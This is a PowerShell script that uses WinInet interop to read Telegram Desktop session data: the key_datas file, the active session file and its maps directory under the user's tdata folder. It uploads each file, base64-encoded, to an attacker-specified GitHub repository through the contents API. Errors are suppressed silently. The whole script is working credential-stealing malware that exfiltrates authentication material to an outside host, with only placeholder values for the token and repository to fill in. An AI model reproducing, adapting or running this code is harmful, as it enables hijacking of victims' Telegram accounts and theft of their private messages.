Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class WinInet {
    [DllImport("wininet.dll", SetLastError = true)]
    public static extern IntPtr InternetOpen(string lpszAgent, uint dwAccessType, string lpszProxyName, string lpszProxyBypass, uint dwFlags);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern IntPtr InternetConnect(IntPtr hInternet, string lpszServerName, int nServerPort, string lpszUsername, string lpszPassword, uint dwService, uint dwFlags, uint dwContext);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern IntPtr HttpOpenRequest(IntPtr hConnect, string lpszVerb, string lpszObjectName, string lpszVersion, string lpszReferer, string[] lplpszAcceptTypes, uint dwFlags, uint dwContext);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern bool HttpSendRequest(IntPtr hRequest, string lpszHeaders, int dwHeadersLength, byte[] lpOptional, int dwOptionalLength);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern bool InternetCloseHandle(IntPtr hInternet);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern bool InternetReadFile(IntPtr hFile, byte[] lpBuffer, int dwNumberOfBytesToRead, out int lpdwNumberOfBytesRead);

    public const uint INTERNET_OPEN_TYPE_DIRECT = 1;
    public const uint INTERNET_SERVICE_HTTP = 3;
    public const uint INTERNET_FLAG_RELOAD = 0x80000000;
    public const uint INTERNET_FLAG_SECURE = 0x00800000;
    public const int INTERNET_DEFAULT_HTTPS_PORT = 443;
}
"@

function Invoke-GitHubWinInetUpload {
    param(
        [string]$Uri,
        [string]$Token,
        [string]$JsonBody
    )
    
    $uriObj = [Uri]$Uri
    $isHttps = $uriObj.Scheme -eq "https"
    
    
    $hInternet = [WinInet]::InternetOpen("PowerShellGitHubUploader", [WinInet]::INTERNET_OPEN_TYPE_DIRECT, $null, $null, 0)
    if ($hInternet -eq [IntPtr]::Zero) {
        return $null
    }

    
    $port = if ($isHttps) { [WinInet]::INTERNET_DEFAULT_HTTPS_PORT } else { 80 }
    $flags = if ($isHttps) { [WinInet]::INTERNET_FLAG_SECURE } else { 0 }
    
    $hConnect = [WinInet]::InternetConnect($hInternet, $uriObj.Host, $port, $null, $null, [WinInet]::INTERNET_SERVICE_HTTP, $flags, 0)
    if ($hConnect -eq [IntPtr]::Zero) {
        [WinInet]::InternetCloseHandle($hInternet)
        return $null
    }

    
    $requestFlags = [WinInet]::INTERNET_FLAG_RELOAD -bor $flags
    $hRequest = [WinInet]::HttpOpenRequest($hConnect, "PUT", $uriObj.PathAndQuery, "HTTP/1.1", $null, $null, $requestFlags, 0)
    if ($hRequest -eq [IntPtr]::Zero) {
        [WinInet]::InternetCloseHandle($hConnect)
        [WinInet]::InternetCloseHandle($hInternet)
        
        return $null
    }

   
    $headers = @(
        "Authorization: token $Token",
        "Accept: application/vnd.github.v3+json",
        "User-Agent: PowerShellWinInet",
        "Content-Type: application/json"
    ) -join "`r`n"

    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($JsonBody)

    
    $success = [WinInet]::HttpSendRequest($hRequest, $headers, $headers.Length, $bodyBytes, $bodyBytes.Length)
    
    $responseContent = $null
    if ($success) {
    
        $buffer = New-Object byte[] 4096
        $responseBuilder = New-Object System.Text.StringBuilder
        $bytesRead = 0
        
        do {
            $readSuccess = [WinInet]::InternetReadFile($hRequest, $buffer, 4096, [ref]$bytesRead)
            if ($bytesRead -gt 0) {
                $responseBuilder.Append([System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)) | Out-Null
            }
        } while ($bytesRead -gt 0)
        
        $responseContent = $responseBuilder.ToString()
    }
    else {

    }

    
    [WinInet]::InternetCloseHandle($hRequest)
    [WinInet]::InternetCloseHandle($hConnect)
    [WinInet]::InternetCloseHandle($hInternet)

   
}





$user = $env:USERNAME
$tdata = "C:/Users/"+$user+"/AppData/Roaming/Telegram Desktop/tdata"
$activesession = Get-ChildItem -Path $tdata -Directory -Recurse | 
        Where-Object { Test-Path "$($_.FullName)\maps" } | 
        Select-Object -ExpandProperty Name

$token = "YOUR GITHUB API KEY"
$owner = "YOUR GITHUB USERNAME"
$repo = "YOUR GITHUB REPO NAME"
$branch = "YOUR GITHUB BRANCH NAME" 


$filesToUpload = @(
    @{
        LocalPath = $tdata + "/key_datas"
        RemotePath = "tdata/key_datas"
    },
    @{
        LocalPath = $tdata + "/" + $activesession + "s"  # session file
        RemotePath = "tdata/$activesession" + "s"
    },
    @{
        LocalPath = $tdata + "/" + $activesession + "/maps"
        RemotePath = "tdata/$activesession/maps"
    }
)



foreach ($fileInfo in $filesToUpload) {
    $filepath = $fileInfo.LocalPath
    $remotePath = $fileInfo.RemotePath
    
    if (Test-Path $filepath) {
        $uri = "https://api.github.com/repos/$owner/$repo/contents/$remotePath"
        
        try {
           
            if (Test-Path $filepath -PathType Container) {
               
                $files = Get-ChildItem -Path $filepath -File -Recurse
                foreach ($file in $files) {
                    $relativePath = $file.FullName.Substring($filepath.Length).TrimStart('\', '/')
                    $fileRemotePath = "tdata/$activesession/$relativePath"
                    
                    $fileUri = "https://api.github.com/repos/$owner/$repo/contents/$fileRemotePath"
                    
                  
                    
              
                    $fileContent = [System.IO.File]::ReadAllBytes($file.FullName)
                    $base64Content = [Convert]::ToBase64String($fileContent)

                    $body = @{
                        message = "Add file via PowerShell WinINet"
                        content = $base64Content
                        branch = $branch
                    }

                   

                    $jsonBody = $body | ConvertTo-Json -Depth 10
                    $result = Invoke-GitHubWinInetUpload -Uri $fileUri -Token $token -JsonBody $jsonBody
                    
                }
            }
            else {
                
                $fileContent = [System.IO.File]::ReadAllBytes($filepath)
                $base64Content = [Convert]::ToBase64String($fileContent)

                $body = @{
                    message = "Add file via PowerShell WinINet"
                    content = $base64Content
                    branch = $branch
                }

           
                $jsonBody = $body | ConvertTo-Json -Depth 10
                $result = Invoke-GitHubWinInetUpload -Uri $uri -Token $token -JsonBody $jsonBody
                
            }
        }
        catch {
            
        }
    }
    else {
        
    }
}
